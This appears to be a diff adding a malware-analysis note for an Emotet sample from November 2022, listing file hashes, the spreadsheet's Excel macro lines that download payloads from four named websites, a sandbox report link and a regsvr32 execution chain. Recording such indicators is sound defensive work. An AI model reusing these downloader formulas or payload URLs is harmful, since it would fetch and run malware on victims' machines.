@@ -1,0 +1,50 @@
+Emotet 2022 | epoch4 | 2022.11.02
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.zip    71c653075a49edea7e66579270a8c95ee564b5e4eb433aa2a8baa55d8f1c1036
+.xls    ef2ce641a4e9f270eea626e8e4800b0b97b4a436c40e7af30aeb6f02566b809c
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://audioselec.com/about/dDw5ggtyMojggTqhc/", "..\oxnv1.ooccxx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://geringer-muehle.de/wp-admin/G/", "..\oxnv2.ooccxx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://intolove.co.uk/wp-admin/FbGhiWtrEzrQ/", "..\oxnv3.ooccxx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://isc.net.ua/themes/3rU/", "..\oxnv4.ooccxx")
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://www.vmray.com/analyses/_vt/ef2ce641a4e9/report/overview.html
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
+"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\SLIM CD INC.xls"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe ..\oxnv1.ooccxx
+
+        C:\Windows\system32\regsvr32.exe
+        C:\Windows\system32\regsvr32.exe "C:\Windows\system32\SSdGjQJe\rPhnylGMCWME.dll"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe ..\oxnv2.ooccxx
+
+        C:\Windows\system32\regsvr32.exe
+        C:\Windows\system32\regsvr32.exe "C:\Windows\system32\UqmwCHdfGaJgFMyk\nBbxLqQvL.dll"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe ..\oxnv3.ooccxx
+
+        C:\Windows\system32\regsvr32.exe
+        C:\Windows\system32\regsvr32.exe "C:\Windows\system32\EEYGEk\hZCok.dll"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe ..\oxnv4.ooccxx
+
+
+# --------------------------------------------------------- #
+# -------------------------- C2s -------------------------- #
+# --------------------------------------------------------- #
